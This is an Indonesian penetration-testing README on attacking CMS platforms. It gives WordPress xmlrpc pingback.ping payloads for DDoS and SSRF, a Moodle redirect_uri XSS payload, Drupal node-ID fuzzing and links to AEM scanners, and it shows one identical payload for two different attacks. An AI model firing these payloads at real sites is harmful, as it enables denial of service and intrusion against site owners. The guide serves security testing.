# CMS (Content Management System)
## Definisi

Content Management System (CMS) adalah sebuah platform software yang yang memungkinkan pengguna untuk membangun dan mengelola situs web dengan pengetahuan dan sumber daya teknis yang terbatas. Ini memungkinkan pengguna untuk membuat, mengelola, dan memodifikasi konten di situs web dengan Graphic User Interface (GUI) yang membuat interaksi menjadi user friendly tanpa memerlukan pengetahuan teknis apa pun.

## Beberapa Platform yang **Mungkin** rentan akan CMS
1. [Wordpress](https://github.com/rad1zly/penetration-testing/blob/main/Teknik-Serangan/CMS/README.md#teknik-serangan-pada-platform-wordpress)
2. [Adobe Experience Manager](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-adobe-experience-manager)
3. [Drupal](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-drupal)
4. [Moodle](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-moodle)

## Teknik Serangan pada platform Wordpress
Berikut merupakan beberapa *security misconfiguration* yang biasa terjadi pada platform Wordpress beserta *tools* yang bisa digunakan untuk mendeteksi terjadinya kerentanan tersebut. 

### Tool untuk deteksi
1. [Wappalyzer](https://www.wappalyzer.com/)
2. [WhatRuns](https://www.whatruns.com/)
3. [BuildWith](https://builtwith.com/)
4. [WpScan](https://github.com/wpscanteam/wpscan)
5. [XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)

### xmlrpc.php
Ini merupakan kerentanan paling umum pada wordpress, cara mendeteksi kerentanan tersebut adalah sebagai berikut :
* kunjungi site dari ```siteyangdituju.com/xmlrpc.php```
* Mendapatkan pesan error tentang *POST request only*

Kemudian berikut cara melakukan exploitnya:
* Lakukan *intercept* pada *request* dan ubah *method* GET ke POST
* Kemudian masukan payload ini saat POST untuk melihat semua *Method* yang bisa digunakan
    ```
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>
    ```
* Lihat apabila ada *method* ```pingback.ping``` pada list yang ditampilkan
* Jika ada *method* diatas maka bisa dilakukan DDoS dengan *payload* berikut:
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<IP SERVER ANDA>:<port></string></value>
    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
    </value></param></params>
    </methodCall>
    ```
* Selain itu juga bisa dilakukan serangan SSRF (Khusus untuk port internal) dengan payload berikut:
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<IP SERVER ANDA>:<port></string></value>
    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
    </value></param></params>
    </methodCall>
    ```

## Teknik Serangan pada platform Adobe Experience Manager (AEM)
Berikut merupakan teknik serangan pada platform Adobe Experience Manager (AEM)
### Tools yang bisa digunakan untuk mendeteksi
+ [aem-hacker](https://github.com/0ang3el/aem-hacker)
+ [aemscan](https://github.com/Raz0r/aemscan)

### Wordlist untuk melakukan *fuzzing* AEM
+ [wordlist_aem.txt](https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths)

### Sumber
+ *[Approaching AEM](https://www.bugcrowd.com/resources/webinar/aem-hacker-approaching-adobe-experience-manager-web-apps/)*
+ [Teknik Mengamankan AEM](https://www.slideshare.net/0ang3el/securing-aem-webapps-by-hacking-them)

## Teknik Serangan pada platform Drupal
Berikut merupakan teknik serangan pada platform Drupal. Lakukan *fuzzing* dengan menggunakan *intruder* pada Burpsuite pada ```/node/$``` dimana ```'$'``` adalah sebuah nomor (contohnya dari 1 hingga 1000 misalnya). Dari sana anda memungkinkan menemukan halaman tersembunyi seperti test, dev, admin, dan lain sebagainya yang tidak bisa dilihat dari *search engine*.
### Sumber
+ [Drupal](https://0xblackbird.github.io/blog/post1)
## Teknik Serangan pada platform Moodle
Berikut merupakan teknik serangan pada platform Moodle.
### Tool untuk deteksi
1. [Wappalyzer](https://www.wappalyzer.com/)
2. [WhatRuns](https://www.whatruns.com/)
3. [BuildWith](https://builtwith.com/)

### Payload Exploit
Berikut merupakan payload exploit yang bisa digunakan saat menemukan platform Moodle.
* Menginjeksi XSS pada redirect url
``` 
https://MOODLE.TARGET.COM/mod/lti/auth.php?redirect_uri=javascript:alert(‘PAYLOAD’) 
```
* Menggunakan Template Nuclei -> [Moodle XSS Template](https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/moodle/moodle-xss.yaml)

## Author
**[rad1zly](https://github.com/rad1zly)**


